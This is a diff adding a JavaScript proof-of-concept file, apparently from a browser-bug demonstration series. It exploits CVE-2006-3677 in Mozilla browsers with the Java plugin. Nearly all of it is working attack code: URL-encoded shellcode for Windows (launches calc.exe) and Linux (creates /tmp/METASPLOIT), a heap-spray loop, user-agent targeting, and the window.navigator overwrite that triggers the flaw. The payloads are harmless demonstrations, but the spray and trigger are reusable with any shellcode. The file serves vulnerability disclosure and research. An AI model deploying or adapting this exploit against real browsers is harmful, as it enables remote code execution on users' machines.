@@ -1,0 +1,69 @@
+// MoBB Demonstration
+function Demo() {
+
+	// Exploit for http://www.mozilla.org/security/announce/2006/mfsa2006-45.html
+	// https://bugzilla.mozilla.org/show_bug.cgi?id=342267
+	// CVE-2006-3677
+
+	// The Java plugin is required for this to work
+
+	// win32 = calc.exe
+	var shellcode_win32 = unescape('%ue8fc%u0044%u0000%u458b%u8b3c%u057c%u0178%u8bef%u184f%u5f8b%u0120%u49eb%u348b%u018b%u31ee%u99c0%u84ac%u74c0%uc107%u0dca%uc201%uf4eb%u543b%u0424%ue575%u5f8b%u0124%u66eb%u0c8b%u8b4b%u1c5f%ueb01%u1c8b%u018b%u89eb%u245c%uc304%uc031%u8b64%u3040%uc085%u0c78%u408b%u8b0c%u1c70%u8bad%u0868%u09eb%u808b%u00b0%u0000%u688b%u5f3c%uf631%u5660%uf889%uc083%u507b%u7e68%ue2d8%u6873%ufe98%u0e8a%uff57%u63e7%u6c61%u2e63%u7865%u0065');
+	var fill_win32 = unescape('%u0800');
+	var addr_win32 = 0x08000800;
+	
+	// linux = touch /tmp/METASPLOIT (unreliable)
+	var shellcode_linux = unescape('%u0b6a%u9958%u6652%u2d68%u8963%u68e7%u732f%u0068%u2f68%u6962%u896e%u52e3%u16e8%u0000%u7400%u756f%u6863%u2f20%u6d74%u2f70%u454d%u4154%u5053%u4f4c%u5449%u5700%u8953%ucde1%u8080');
+	var fill_linux = unescape('%ua8a8');
+	var addr_linux = -0x58000000; // Integer wrap: 0xa8000000
+	
+	var shellcode;
+	var addr;
+	var fill;
+	
+	if (navigator.userAgent.indexOf('Linux i') != -1) {
+		alert('Trying to create /tmp/METASPLOIT');
+		shellcode = shellcode_linux;
+		addr = addr_linux;
+		fill = fill_linux;
+	}
+	
+	if (navigator.userAgent.indexOf('Windows') != -1) {
+		alert('Trying to launch Calculator');	
+		shellcode = shellcode_win32;
+		addr = addr_win32;
+		fill = fill_win32;
+	}	
+	
+	if (! shellcode) {
+		alert('OS not supported, only attempting a crash!');
+		shellcode = unescape('%ucccc');
+		fill = unescape('%cccc');
+		addr = 0xcccccccc;
+	}
+		
+	var b = fill;
+	while (b.length <= 0x400000) b+=b;
+
+	var c = new Array();
+	for (var i =0; i<36; i++) {
+		c[i] = 
+			b.substring(0,  0x100000 - shellcode.length) + shellcode +
+			b.substring(0,  0x100000 - shellcode.length) + shellcode + 
+			b.substring(0,  0x100000 - shellcode.length) + shellcode + 
+			b.substring(0,  0x100000 - shellcode.length) + shellcode;
+	}
+			
+	
+	if (window.navigator.javaEnabled) {
+		window.navigator = (addr / 2);
+		try {
+			java.lang.reflect.Runtime.newInstance(
+				java.lang.Class.forName("java.lang.Runtime"), 0
+			);
+			alert('Patched!');
+		}catch(e){
+			alert('No Java plugin installed!');
+		}
+	}
+}
